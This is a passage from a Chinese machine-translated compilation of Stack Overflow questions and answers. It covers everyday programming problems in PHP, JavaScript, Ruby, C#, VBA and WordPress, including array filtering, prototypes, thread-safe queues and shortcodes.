1.  我要提到的第一件事`ByReference`是在传递数组时传递变量是必要的。我很确定我们通过引用传递了所有变量，但如果 FORTRAN 没有修改它，我不确定是否有必要。这可能是您的 AccessViolation 错误的来源。

2.  其次，我提出了 StdCall CallingConvention，但我不能 100% 确定 IVF 中的默认调用约定是什么。`CDECL`我们总是在我们的属性头中明确地设置它。

3.  最后，我会谨慎地将 2D(+) 数组传递给 FORTRAN。我认为我没有实际测试过或看过它，但我在 IVF 开发人员论坛上读到 FORTRAN 转置了从 .NET 传递的数组（行变成列）。只是另一件需要注意的事情。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-05-09T02:38:16.847

我知道这是一个老问题，但有一个简单的答案，似乎没有人注意到。您已经声明了 arr(0 To 2, 0 To 6)，但是您调用的 arr(3,3) 超出了声明的范围（3 不包含在 0 To 2 中）。System.AccessViolationException 是一个常见错误，通常表明您已在数组边界之外引用，即您试图访问内存中尚未为该变量保留的内容，因此访问冲突。

如果你使用了 TextBox1.Text = arr(2,3)，你不应该得到那个错误，整个事情应该可以正常工作。

希望这对现在正在查看该问题的任何人有所帮助。

# php - 通过值数组的键组合键和值数组

> ID：13916826
> 
> 赞同：0
> 
> 时间：2012-12-17T15:17:16.907
> 
> 标签：php, arrays

我有两个数组。

```
$keys = array(1,2,3,6,9); //note that 9 does not exist as key in the $values array
$values = array('000', '001', '002', '003', '004', '005', '006', '007'); 
```

我想做的是以这样的方式组合这两个数组，我将得到一个由数组过滤的`$keys`数组。您可以说该`$values`数组被反映到`$keys`返回一个过滤数组的数组中，其中只有`$values`当 的键`$values`等于`$keys`数组中的值之一时才会出现。

这个问题很难用语言来解释，所以我上面的问题就在下面的 foreach 中：

```
foreach ($keys as $k){
    if (!array_key_exists($k, $values)){ continue; } //prevents $k=9 as key in the $values array
    $new[$k] = $values[$k];
}
print_r($new); // Array ( [1] => 001 [2] => 002 [3] => 003 [6] => 006 ) 
```

我认为结合使用[array_merge](http://php.net/manual/en/function.array-merge.php)、[array_combine](http://php.net/manual/en/function.array-combine.php)、[array_diff](http://php.net/manual/en/function.array-diff.php)和/或[array_unique](http://php.net/manual/en/function.array-unique.php)应该是可能的，但我似乎无法找出解决方案。上面的 foreach 可能是最好的方法，但我可以想象必须有另一种很好的方法来做到这一点。所以我的问题基本上是：有没有另一种方法可以用更少的代码实现同样的目标？

我知道数组中存在哪些键`$values`，但我必须以`$values`一种很好的方式反映这些键。

```
$keys_in_values = array_intersect($keys, array_keys($values));
// Array ( [0] => 1 [1] => 2 [2] => 3 [3] => 6 ) 
```

现在你可能会问为什么我不只是使用 foreach。嗯，答案很简单。因为我不想。我似乎 100% 正确，但我只是好奇是否有其他/更好的解决方案。我有一些更高级的代码片段，我想（递归地）使用它，但这对于这个问题来说有点太多了，因为答案是一样的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-17T15:25:02.647

你只需要`array_intersect_key`+`array_flip`

```
$data = array_intersect_key($values, array_flip($keys));
var_dump($data); 
```

输出

```
array (size=4)
  1 => string '001' (length=3)
  2 => string '002' (length=3)
  3 => string '003' (length=3)
  6 => string '006' (length=3) 
```

# javascript - 函数和对象的原型构造函数

> ID：13916834
> 
> 赞同：0
> 
> 时间：2012-12-17T15:17:37.560
> 
> 标签：javascript, prototype

因此，我一直在阅读有关原型的大量信息，并且大部分都得到了它，我的意思是，我得到了以下内容。

```
var Animal = function(species) {
    this.species = species;
};
Animal.prototype.getSpecies = function() {
    return this.species;
}
var myDog = new Animal("Anderson");    
alert(myDog.getSpecies()); 
```

我什至明白我可以创建一个新物种并将原型设置为 Animal，然后能够调用 getSpecies()。是的！

让我困惑的是：

```
var Person = function(firstName, lastName) {
    this.firstName= firstName;
    this.lastName= lastName
};

var meToo = { fName: "ken", lName: "N" };
alert(meToo.constructor.prototype);  // [object Object]
alert(Person.constructor.prototype); // function Empty(){} 
```

[http://jsfiddle.net/r0k3t/s8Sx7/9/](http://jsfiddle.net/r0k3t/s8Sx7/9/)

我试图找到一些东西来解释为什么 Person 的原型是 function() {}？我认为它将被设置为全局对象“this”（在这种情况下是窗口）。另外 - 为什么我不能列举它的属性？阅读[此](http://javascriptweblog.wordpress.com/2010/06/07/understanding-javascript-prototypes/)内容表明我可以使用 constructor.prototype 来检索我认为是“窗口”的对象，然后仅枚举属性。

很明显我错过了一些东西 - 谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-17T15:23:46.383

对象的原型`Person`，只是`Person.prototype`. 不`Person.constructor.prototype`，这是非常不同的：

`Person.constructor`, 是`Function`构造所有函数的函数。因为`Person`是一个函数，所以它`.constructor`是`Function`。

对象（所有函数）的原型`Function`就是`Function.prototype`. 所以，`Person.constructor.prototype === Function.prototype`。

普通对象的构造函数是`Object`函数。所有普通对象的原型是`Object.prototype`，它是一个`"[object Object]"`(Prefer `console.dir`over `alert`, to see more)。

我所说的普通对象是指用`{}`or创建的任何东西`new Object()`

# ruby - 如何修剪哈希？

> ID：13916845
> 
> 赞同：0
> 
> 时间：2012-12-17T15:18:30.097
> 
> 标签：ruby

鉴于此哈希：

```
h = { "01"=>0, "02"=>0, "03"=>5, "04"=>6, "05"=>0, "06"=>0, "07"=>0, "08"=>7, "09"=>8, "10"=>0, "11"=>0, "12"=>0 } 
```

我如何修剪它以获得这个结果：

```
h = { "03"=>5, "04"=>6, "05"=>0, "06"=>0, "07"=>0, "08"=>7, "09"=>8 } 
```

也就是说，我想从哈希的开头和结尾删除零值。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T15:25:21.480

您可以使用`break`来停止执行。

```
h.delete_if{|k,v| v == 0 ? true : break }
h.reverse_each{|k,v| v == 0 ? h.delete(k) : break } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T16:26:03.807

改进了 CubaLibre 的回答：

```
Hash[h.drop_while { |k,v| v == 0 }.reverse.drop_while { |k,v| v == 0 }.reverse] 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-17T15:35:15.710

```
Hash[h.drop_while {|k,v| v == 0 }.take_while {|k,v| v != 0}] 
```

此版本对 Hash 中的键顺序进行了假设，这不是一个好主意。

也许选择和拒绝的组合会更好读。

# c# - 需要制作一个项目列表的动态 FIFO 队列

> ID：13916855
> 
> 赞同：0
> 
> 时间：2012-12-17T15:18:51.260
> 
> 标签：c#, queue

我想为列表中的所有项目创建一个 FIFO 队列。我需要从队列中检索列表中的项目。

这是我的代码：

```
using System.Collections.Generic;

namespace CHPCanControl
{
  public class signals
 {
    public double quant;
    public int Ind;
    public int Subin;
    public int Control;
    public int dat;
    public List<signals> signalList;

    public signals(double quant, int Ind, int Subin, int Control, int dat)
    {

        this.quant = quant;
        this.Ind = Ind;
        this.Control = Control;
        this.Subin = Subin;
        this.dat = dat;
    }
 }

 public class Controlsignal 
{
   public List<signals> signalList = new List<signals>(); // this is my first list

    public void main()
    {
        signalList.Add(new signals(1, 1000, 1, 0x60, 1));
        signalList.Add(new signals(1, 1000, 2, 0x60, 1));
        signalList.Add(new signals(1, 1000, 3, 0x60, 1));
        signalList.Add(new signals(1, 1000, 4, 0x60, 1));
        signalList.Add(new signals(0.5, 1000, 5, 0x60, 200));
        signalList.Add(new signals(1, 1000, 6, 0x60, 1));
        signalList.Add(new signals(1, 1000, 7, 0x60, 1));
        signalList.Add(new signals(0.0625, 1000, 8, 0x60, 1));
        signalList.Add(new signals(0.1, 1000, 9, 0x60, 1));
        signalList.Add(new signals(0.1, 1000, 10, 0x60, 1));
    }
  }

   public class Statussignal
{
   public List<signals> signalList1 = new List<signals>(); // this is my second list

    public void main()
    {
        signalList1.Add(new signals(1, 1100, 1, 0x40, 1));
        signalList1.Add(new signals(1, 1100, 2, 0x40, 1));
        signalList1.Add(new signals(1, 1100, 3, 0x40, 1));
        signalList1.Add(new signals(0.0002, 1100, 4, 0x40, 1));
        signalList1.Add(new signals(0.5, 1100, 5, 0x40, 200));
        signalList1.Add(new signals(1, 1100, 6, 0x40, 1));
        signalList1.Add(new signals(1, 1100, 7, 0x40, 1));
        signalList1.Add(new signals(1, 1100, 8, 0x40, 1));
    }
  }
 } 
```

我的问题是我想将我的两个列表中的项目添加到 FIFO 队列中。我在想我可能需要从多个线程访问队列。

非常感谢你们的回复，我试图用这种方式做，但我不确定它是否正确..

```
 using System;
  using System.Collections.Generic;
  using System.ComponentModel;
  using System.Data;
  using System.Drawing;
  using System.Linq;
  using System.Text;
  using System.IO;
  using System.Windows.Forms;
  using System.Text.RegularExpressions;
  using System.Threading;

 namespace CHPCanControl
{
public partial class Form1 : Form
{

    Controlsignal control = new Controlsignal();
    Statussignal status = new Statussignal();
    Calibrationparameters calibration = new Calibrationparameters();

    public Form1()
    {
        InitializeComponent();
    }

    private void Form1_Load(object sender, EventArgs e)
    {

        // need to do something here by which you will receieve 
        // your messages here from the ECU

        Thread thread = new Thread(new ThreadStart(this.ECU_Send));
        thread.Start();
        thread.IsBackground = true;

    }
    public void ECU_Send()
    {
        private Queue<control.signalList> queue = new Queue<control.signalList>();
        public event EventHandler Changed;
        protected virtual void OnChanged()
        {
            if(Changed != null)
            {
                Changed(this,EventArgs.Empty);
            }
        }
    public int Count { get { return queue.Count; } }

    public virtual void Enqueue(control.signalList item)
    {
        queue.Enqueue(item);
            OnChanged();
    }

    public virtual void Dequeue()
    {
       control.signalList item = queue.Dequeue();
        OnChanged();
        return item;
    }
   }
  } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T15:22:37.217

*   对于 FIFO，您应该使用`Queue<T>`.
*   对于 LIFO，您应该使用`Stack<T>`.

关于收藏等的更多信息可以在[这里找到](http://msdn.microsoft.com/en-us/library/ms379571%28v=vs.80%29.aspx)

如果您使用的是**.NET 4 或更高版本，**您可以使用，请[在此处](http://msdn.microsoft.com/en-us/library/dd267265.aspx)`ConcurrentQueue<T>`阅读更多内容。如果您使用的是**.NET 3.5 或更低版本，**您可以使用**同步**队列来确保线程安全，可以在[此处](http://msdn.microsoft.com/en-us/library/system.collections.queue.synchronized.aspx)找到一个很好的示例。

 ****```
using System;
using System.Collections;
public class SamplesQueue  {

   public static void Main()  {

      // Creates and initializes a new Queue.
      Queue myQ = new Queue();
      myQ.Enqueue( "The" );
      myQ.Enqueue( "quick" );
      myQ.Enqueue( "brown" );
      myQ.Enqueue( "fox" );

      // Creates a synchronized wrapper around the Queue.
      Queue mySyncdQ = Queue.Synchronized( myQ );

      // Displays the sychronization status of both Queues.
      Console.WriteLine( "myQ is {0}.", myQ.IsSynchronized ? "synchronized" : "not synchronized" );
      Console.WriteLine( "mySyncdQ is {0}.", mySyncdQ.IsSynchronized ? "synchronized" : "not synchronized" );
   }
}
/* 
This code produces the following output.

myQ is not synchronized.
mySyncdQ is synchronized.
*/ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T15:32:50.770

这几乎听起来像您只想使用`IEnumerable`. 这是一种通过只读界面从列表中读取所有项目的方法。您可以`Concat`在 LINQ 中使用来获取`IEnumerable`表示两个列表中的项目的一个。

但是，`IEnumerable`它不是线程安全的，因此如果您计划从多个线程访问队列，那么您将需要使用 a `BlockingCollection`，它会默认包装 a `ConcurrentQueue`。然后，您可以将两个列表中的所有项目添加到队列中，并从任意数量的线程中读取它。****

# wordpress - wordpress 作为决策树

> ID：13916857
> 
> 赞同：1
> 
> 时间：2012-12-17T15:18:55.647
> 
> 标签：wordpress, wordpress-theming, decision-tree

我不确定它是否称为决策树，但我正在寻找一个包含问题的网站，并且可以通过单击是或否按钮来回答。

我想在 Wordpress 中执行此操作，但我没有遇到任何示例。我认为由于每个帖子都有一个唯一的 ID，这应该是可能的，但我不知道如何去做。

有人可以就此提供一些想法或展示可能做某事的模板吗

我想做的例子：一个用户访问我的网站，主页问：“你今天吃饭了吗？” 用户可以选择单击是或否按钮。如果用户单击是，则用户将获得某些信息。如果用户单击“否”，则将用户引导至完全不同的信息。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T15:22:43.340

在最简单的级别上，您需要做的就是将每个页面创建为页面（而不是帖子），并创建带有指向答案页面的链接的问题页面（答案是或否作为链接文本）。然后为链接设置样式，使其看起来像按钮。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-02-20T09:52:53.397

试试这些 WordPress 插件：

1.  **Sidecar 决策树**- [https://wordpress.org/plugins/sidecar-decision-tree/](https://wordpress.org/plugins/sidecar-decision-tree/)

2.  **Zingtree** - [https://wordpress.org/plugins/zingtree/](https://wordpress.org/plugins/zingtree/)

# http - 如何通过 telnet POST REQUEST 保存文件？

> ID：13916868
> 
> 赞同：1
> 
> 时间：2012-12-17T15:19:16.000
> 
> 标签：http, post, https, telnet

当我在 URL 示例中输入某个链接时：

```
https://api.dropbox.com/1/oauth/request_token?oauth_version=1.0&oauth_signature_method=PLAINTEXT&oauth_consumer_key=asdfasdfasdfasdf&oauth_signature=asdfasdfasdf%26 
```

我将自动下载从网站返回的文件。

我如何在 TELNET 中做同样的事情？

对于这个 URL，我必须使用 POST，所以我做了以下命令：

```
POST https://api.dropbox.com/1/oauth/request_token?oauth_version=1.0&oauth_signature_method=PLAINTEXT&oauth_consumer_key=asdfasdfasdfasdf&oauth_signature=asdfasdfasdf%26 
```

但是，我应该添加哪些命令来保存返回的文件？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-18T15:06:25.827

尝试 curl 或 wget 而不是 telnet。

从技术上讲，应该可以从 telnet 转储输出、剪掉正文、进行转码等，但我看不出这比 curl 或 wget 更简单或更便携。

# vba - Excel VBA Marco对多个范围文本值的不同连接进行排序

> ID：13916873
> 
> 赞同：0
> 
> 时间：2012-12-17T15:19:38.947
> 
> 标签：vba, sorting, excel, concatenation, distinct

在 Excel 中，有一种最佳方法可以对来自多个范围的连接值进行 qsort 排序，其中
a) 连接值必须是不同的
b) 每个连接值可以有一个可选的前后文本（分隔符）来包围它
c）连接值被排序（qsort ）。

我在下面的 DISTINCT_CONCAT 函数中实现了 a) 和 b)，但是 c) qsort 没有编码。**在下面的代码中是否有最佳的 qsort 方法（不是冗长的），最好在参数之前和之后使用[Collection Add 方法。](http://msdn.microsoft.com/en-us/library/aa265006%28v=vs.60%29.aspx)任何想法将不胜感激**希望此代码将来可以帮助其他人解决类似问题。

### 示例 Excel 公式：

对于电子表格单元格
A1:A4 包含 21、12、32、12
B2:B4 包含 14、08、12

，公式宏函数 将在另一个电子表格单元格中显示一个不同的范围值列表，如 $list.add("21"); $list.add("12"); $list.add("32"); $list.add("14"); $list.add("08"); 我的偏好是该函数将不同范围值的排序字符串返回为 $list.add("08"); $list.add("12"); $list.add("14"); $list.add("21"); $list.add("32"); `=DISTINCT_CONCAT("$list.add(";"); "&CHAR(10);TRUE;Sheet1!A1:A4;Sheet2!B2:B4)`

### 没有 qsort 的 DISTINCT_CONCAT 函数

目的：一个范围内所有单元格值的不同连接，带有可选的前后文本
输入：
beforeCellValue - 出现在单元格值之前的
可选文本 afterCellValue - 出现在单元格值之后的可选文本
cellValueInQuotes - 如果为真，则单元格值 123 显示为“123 "，否则为 123
cellValueRange - 要连接的一个或多个范围，使用范围的文本值返回：连接字符串

`Public Function DISTINCT_CONCAT( ByVal beforeCellValue As String, ByVal afterCellValue As String, ByVal cellValueInQuotes As Boolean, ParamArray cellValueRange() As Variant) As String`

 ````
 Dim c As Collection, i As Long, cell As Range
  Set c = New Collection
  For i = LBound(cellValueRange) To UBound(cellValueRange)
    For Each cell In cellValueRange(i)
        If Len(cell.text) > 0 Then
            On Error Resume Next
            c.Add cell.value, cell.text ' distinct collection (no duplicates)
            On Error GoTo 0
        End If
    Next cell
    Set cell = Nothing
  Next i

  Dim returnText As String
  Dim value As Variant
  For Each value In c
    If cellValueInQuotes Then
        returnText = returnText & beforeCellValue & Chr(34) & value & Chr(34) & afterCellValue
    Else
        returnText = returnText & beforeCellValue & value & afterCellValue
    End If
  Next value
  DISTINCT_CONCAT = returnText
End Function 
````  `* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-18T00:37:25.987

A`Scripting.Dictionary`在没有任何错误处理的情况下强制键的唯一性，但它不能被排序。

.NET`System.Collections.ArrayList`有一种`Sort`使用快速排序的方法。

这假定引用了`Microsoft Scripting Runtime`.

```
Public Function DISTINCT_CONCAT(ByVal beforeCellValue As String, ByVal afterCellValue As String, ByVal cellValueInQuotes As Boolean, ParamArray cellValueRange() As Variant) As String
Dim i As Long, cell As Variant, dict As New Dictionary, items As Variant, al As Variant, item As Variant
Dim delimiter As String, returnText As String

For i = 0 To UBound(cellValueRange)
    For Each cell In cellValueRange(i)
        dict(cell.Text) = cell.value
    Next
Next

Set al = CreateObject("System.Collections.ArrayList")
items = dict.items
For Each item In items
    al.Add item
Next
al.Sort

'Doing this here limits the number of string concatenations, as does using
'the Join function
If cellValueInQuotes Then
    beforeCellValue = beforeCellValue & Chr(34)
    afterCellValue = Chr(34) & afterCellValue
End If

DISTINCT_CONCAT = beforeCellValue & Join(al.ToArray, afterCellValue & beforeCellValue) & afterCellValue
End Function 
```

不要重新发明轮子，除非你需要一个更好的。:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T22:04:02.910

这是一个奇怪的。我尝试在 Collection 对象上使用传统的排序方法，但是当它删除一个键并尝试添加另一个键时，代码会停止执行而不会出错。奇怪的。由于您试图仅保留唯一值，因此我将 Collection 对象保留在那里。但是，我将内容放入数组中，对数组进行排序，然后使用数组显示值。

```
Option Explicit

Public Function DISTINCT_CONCAT(ByVal beforeCellValue As String, ByVal afterCellValue As String, ByVal cellValueInQuotes As Boolean, ParamArray cellValueRange() As Variant) As String

    Dim c As Collection, i As Long, cell As Range
    Set c = New Collection
    For i = LBound(cellValueRange) To UBound(cellValueRange)
    For Each cell In cellValueRange(i)
        If Len(cell.Text) > 0 Then
            On Error Resume Next
            c.Add cell.value, cell.Text ' distinct collection (no duplicates)
            On Error GoTo 0
        End If
    Next cell
    Set cell = Nothing
    Next i

    Dim arr() As Long
    ReDim arr(1 To c.Count)
    For i = 1 To c.Count
        arr(i) = c(i)
    Next i

    ' sort array
    Dim j As Long, k As Long
    Dim temp As Long
    For j = LBound(arr) To UBound(arr)
        For k = j + 1 To UBound(arr)
            If (arr(j) > arr(k)) Then
                temp = arr(k)
                arr(k) = arr(j)
                arr(j) = temp
            End If
        Next k
    Next j

    Dim returnText As String
    Dim value As Variant

    For i = LBound(arr) To UBound(arr)
        If cellValueInQuotes Then
            returnText = returnText & beforeCellValue & Chr(34) & arr(i) & Chr(34) & afterCellValue
        Else
            returnText = returnText & beforeCellValue & arr(i) & afterCellValue
        End If
    Next i
    DISTINCT_CONCAT = returnText
End Function 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-17T23:31:30.403

好的，与此同时，我为不同范围值的集合提出了一个快速排序功能。函数 DISTINCT_CONCAT 现在采用额外的排序类型参数 [0（无排序）、1（升序排序）、2（降序排序）]。

这可能对某人有帮助。这是代码。如果有人认为有更优化的解决方案，请随时更新代码。

在电子表格单元格

Sheet1 - A1:A4 包含
21、12、32、12 Sheet2 - B2:B4 包含 14、08、12

的情况下，公式

`=DISTINCT_CONCAT("$list.add(""";"""); "&CHAR(10);1;Sheet1!A1:A4;Sheet2!B2:B4`

现在将返回不同范围值的串联排序 asc 字符串，每个值的任一侧都有所需的文本

$list.add("08");
$list.add("12");
$list.add("14");
$list.add("21");
$list.add("32");

我使用有限的本机 Excel 函数 CONCATENATE 编写了 DISTINCT_CONCAT 一个更优化的解决方案。

 `````
Purpose: Distinct Concatenation of all cell values in a range, with optional before and after text
Inputs:  
   beforeValue - optional text to appear before cell value
   afterValue - optional text to appear after cell value
   sortType - sort distinct cell values, use 0 (no sort), 1 (sort ascending), 2 (sort descending)
   rangeOfValues- one or more ranges to be concatenated, using the text value of the range
Returns: a range of values as a distinct concatenated string optionally sorted with before and after text

Public Function DISTINCT_CONCAT( _
      ByVal beforeValue As String, _
      ByVal afterValue As String, _
      ByVal sortType As Integer, _
      ParamArray rangeOfValues() As Variant) As String

    ' add range of values to distinct collection
    Dim c As Collection, i As Long, cell As Range
    Set c = New Collection
    For i = LBound(rangeOfValues) To UBound(rangeOfValues)
        For Each cell In rangeOfValues(i)
            If Len(cell.text) > 0 Then
                On Error Resume Next
                c.Add cell.value, cell.text ' ignores duplicates
                On Error GoTo 0
            End If
        Next cell
        Set cell = Nothing
    Next i

    ' optional sort
    Call Sort(c, sortType)

    ' concatenation distinct values into a string with optional before and after value delimitors
    Dim text As String
    Dim value As Variant
    For Each value In c
        text = text & beforeValue & value & afterValue
    Next value
    DISTINCT_CONCAT = text
End Function 
````  ``````
Private Function Sort(ByRef c As Collection, ByVal sortType As Integer)
    Dim i As Long, j As Long

    If sortType < 1 And sortType > 2 Then Exit Function

    For i = 1 To c.Count - 1
        For j = i + 1 To c.Count
            If sortType = 1 Then
                If c(i) > c(j) Then Swap c, i, j
            ElseIf sortType = 2 Then
                If c(i) < c(j) Then Swap c, i, j
            End If
        Next
    Next
End Function 
````  ``````
Private Function Swap(ByRef c As Collection, ByVal i As Long, ByVal j As Long)
    c.Add c(j), , , i
    c.Add c(i), , , j + 1
    c.Remove i
    c.Remove j
End Function 
``````````

# php - Wordpress 简码返回“数组”

> ID：13916874
> 
> 赞同：1
> 
> 时间：2012-12-17T15:19:39.763
> 
> 标签：php, wordpress

我正在制作一个自定义简码，它基本上只是为了返回我的自定义帖子类型，这是我的代码：

```
function shortcode_slider($atts, $content=null){  
    extract(shortcode_atts( array('id' => ''), $atts));  
    $return = $content;
    $return .= query_posts( array( 'post_status' => 'publish' , 'post_type' => 'slider'  ) );
    return $return;  
}  
add_shortcode('slider', 'shortcode_slider'); 
```

除了一件事之外，短代码可以正常工作 - 当它返回所有帖子时，它还会在列表顶部返回“数组” - 知道为什么会发生这种情况吗？

另外，我希望能够使用“id”输入来指定一个类别，例如

```
 $return .= query_posts( array( 'post_status' => 'publish' , 'post_type' => 'slider', 'category' => $id  ) ); 
```

但我不确定这个的正确语法。

任何帮助深表感谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-20T18:33:27.923

首先，**不要使用** `query_posts`.
请检查：

*   [什么时候应该使用 WP_Query、query_posts() 和 get_posts()？](https://wordpress.stackexchange.com/q/1753/12615)
*   [何时使用 WP_query()、query_posts() 和 pre_get_posts](https://wordpress.stackexchange.com/q/50761/12615)

在简码情况下，我会选择[`get_posts`](http://codex.wordpress.org/Template_Tags/get_posts). 它将返回您需要的内容，并且不会弄乱循环。

值得注意的是，您实际上并不需要提取属性，使用`$atts['id']`就可以了。

遵循有效的简码，请参阅评论：

```
add_shortcode( 'slider', 'shortcode_slider' );

function shortcode_slider( $atts, $content=null )
{  
    // Initialize variable and check for shortcode content
    $return = '';
    if( $content ) {
        $return = $content;
    }

    // Shortcode attribute: title="Lorem Ipsum"
    if( isset( $atts['title'] ) ) 
    {
        $return .= '<br><h2>' . $atts['title'] . '</h2>';
    }

    // Get our custom posts
    // 'category' is the category ID or a comma separated list of ID numbers
    $sliders = get_posts( array( 
        'post_status' => 'publish', 
        'post_type' => 'slider',
        'numberposts' => 10, 
        'order'=> 'ASC', 
        'orderby' => 'title',
        'category' => $atts['id']  
    ) );

    // Auxiliary variable, don't print <br> in the first element
    $first = '';

    // Iterate through the resulting array
    // and build the final output
    // Use $slide->post_author, ->post_excerpt, as usual
    //   $slide->ID can be used to call auxiliary functions 
    //   such as get_children or get_permalink
    foreach( $sliders as $slide ) 
    {
        $link = get_permalink( $slide->ID );
        $return .= 
            $first
            . '<a href="' . $link . '">'
            . $slide->post_title 
            . '</a>
        ';
        $first = '<br>';
    }

    return $return;  
} 
```

**在默认帖子类型中应用的简码：**

> ![短代码](../Images/284cec99171202bb15c1433527d6f2b4.png)

**自定义帖子类型：**

> ![cpt](../Images/b70630f4d2098e47431eb4836de3c706.png)

**结果：**

> ![cpt 简码结果](../Images/b9a60a38acce5792f6a01c1e22dca2b5.png)

**有用的链接：**

*   [WordPress 简码：完整指南](http://wp.smashingmagazine.com/2012/05/01/wordpress-shortcodes-complete-guide/)
*   [如何将简码添加到您的 WordPress 插件](http://wpmu.org/how-to-add-shortcodes-to-your-wordpress-plugin/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T15:41:18.167

似乎包含“数组”是因为您首先使用 $content 。可以肯定的是，您必须在帖子中发布您是如何编写此短代码的，但这是一般的想法。您可能不需要该行：

```
$return = $content; 
```

如果您的简码语法是`[slider]some text[/slider]`，那么上面的行是可以的。

至于第二部分，您将在代码中使用 $atts['id'] 检索 id。您的简码将是：

```
[slider id="5"] 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-20T15:39:36.687

它打印 Array 的原因就在这里：

```
$return .= query_posts( ... 
```

首先，您设置`$return`为内容字符串。然后，附加一个由它返回的数组`query_posts()`。我有点惊讶您没有收到“数组到字符串转换”错误，但也许您正在抑制它们。

WordPress 自动回声短代码，所以无论你怎么`return`回声。使用简码获取帖子可能不是最好的主意。简码应该返回字符串。

这个答案感觉不完整，因为不清楚您要完成什么。`query_posts`是为了改变循环，但是当短代码被触发时，你已经在循环中了。

# google-earth-plugin - Earth API-双击隐藏地标描述气球？

> ID：13916877
> 
> 赞同：1
> 
> 时间：2012-12-17T15:19:51.880
> 
> 标签：google-earth-plugin

我显示了许多地标，每个地标都包含一个描述。单击时会显示说明气球，这很好，但双击时我想飞到坐标而不显示气球。是否有代码可以在双击时关闭气球/地标显示？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-20T06:40:57.107

执行此操作的正确方法是使用该`KmlEvent` `preventDefault()`方法取消默认行为。如果需要，您通常会在同一个处理程序中为事件实现自己的行为。

类似于以下内容。

```
// listen for all double-click events 
google.earth.addEventListener(ge.getWindow(), 'dblclick', function(e) {

    // get the target of the event
    var target = e.getTarget();

    // we are only interested in placemarks, so...
    if(target.getType() == 'KmlPlacemark') {

      // stop the default behaviour.
      // for placemarks the default behaviour is the balloon popping up
      e.preventDefault();

      // Add any custom behaviour here
    }
}); 
```

# c# - 当 [STAThread] 已在 main() 上方列出时处理线程状态异常

> ID：13916882
> 
> 赞同：0
> 
> 时间：2012-12-17T15:20:18.617
> 
> 标签：c#, winforms, multithreading, exception

我有一个安装程序，我正在尝试添加一个在安装过程中到达某个点时弹出的表单。

此表单用于获取所需的文件夹位置，以用作安装部分的位置。表格很好，如果我手动打入文件夹位置，它就可以工作。但是哪个用户想要手动执行此操作呢？所以我添加了一个按钮，该按钮应该用作文件夹对话框，但是，当单击它时，我得到一个线程状态异常。

在研究了这个问题之后，发生这种情况的最常见原因是因为您在程序的 main 方法上缺少 [stathread]。这已经添加到我的安装程序中，所以我希望有人可以让我知道我到底做错了什么，因为 winforms 不是我花了很多时间使用的东西。

这是我用于解决这个特定问题的代码。

打开表单的调用。

```
OracleDriveLocations ODL = new OracleDriveLocations();
ODL.ShowDialog(); 
```

文件夹对话按钮的代码。

```
this.folderBrowserDialog1.RootFolder = Environment.SpecialFolder.MyComputer;
this.folderBrowserDialog1.ShowNewFolderButton = true;
DialogResult rst = this.folderBrowserDialog1.ShowDialog();
if (rst == DialogResult.OK)
{
  string path = this.folderBrowserDialog1.SelectedPath;
  logger.DebugFormat("Data Files path was changed to {0}.", path);
  this.DataFileLocationTB.Text = path;
} 
```

我也尝试使用临时线程来运行它，但无济于事：

```
var t = new Thread((ThreadStart)(() => 
{
                this.folderBrowserDialog1.RootFolder = Environment.SpecialFolder.MyComputer;
                this.folderBrowserDialog1.ShowNewFolderButton = true;
                DialogResult rst = this.folderBrowserDialog1.ShowDialog();
                if (rst == DialogResult.OK)
                {
                    string path = this.folderBrowserDialog1.SelectedPath;
                    logger.DebugFormat("Data Files path was changed to {0}.", path);
                    this.DataFileLocationTB.Text = path;
                }
}));

t.SetApartmentState(ApartmentState.STA);
t.Start();
t.Join(); 
```

**请求的堆栈跟踪**

```
 at System.Windows.Forms.FolderBrowserDialog.RunDialog(IntPtr hWndOwner)    
    at System.Windows.Forms.CommonDialog.ShowDialog(IWin32Window owner)   
    at DM.Installer.OracleDriveLocations.DataFilesButton_Click(Object sender, EventArgs e) in C:\Users\Administrator\Desktop\PIDirect_Access\Installer\PIDirectAccessInstaller64Bit
        - try 2\DM.Installer\OracleDriveLocations.cs:line 51   
 at System.Windows.Forms.Control.OnClick(EventArgs e)   
 at System.Windows.Forms.Button.OnMouseUp(MouseEventArgs mevent)    
    at System.Windows.Forms.Control.WmMouseUp(Message& m, MouseButtons button, Int32 clicks)    
    at System.Windows.Forms.Control.WndProc(Message& m)    
    at System.Windows.Forms.ButtonBase.WndProc(Message& m)    
    at System.Windows.Forms.Button.WndProc(Message& m)    
    at System.Windows.Forms.Control.ControlNativeWindow.WndProc(Message& m)   
    at System.Windows.Forms.NativeWindow.DebuggableCallback(IntPtr hWnd, Int32 msg, IntPtr wparam, IntPtr lparam)    
    at System.Windows.Forms.UnsafeNativeMethods.DispatchMessageW(MSG& msg)    
    at      System.Windows.Forms.Application.ComponentManager.System.Windows.Forms.UnsafeNativeMethods.IMsoComponentManager.FPushMessageLoop(Int32 dwComponentID, Int32 reason, Int32 pvLoopData)   
    at System.Windows.Forms.Application.ThreadContext.RunMessageLoopInner(Int32 reason, ApplicationContext context)    at System.Windows.Forms.Application.ThreadContext.RunMessageLoop(Int32 reason, ApplicationContext context)    
    at System.Windows.Forms.Form.ShowDialog(IWin32Window owner)    
    at DM.Installer.SchemaHandler.Install(BackgroundWorker worker, DoWorkEventArgs e, InstallerData data) in C:\Users\Administrator\Desktop\PIDirect_Access\Installer\PIDirectAccessInstaller64Bit
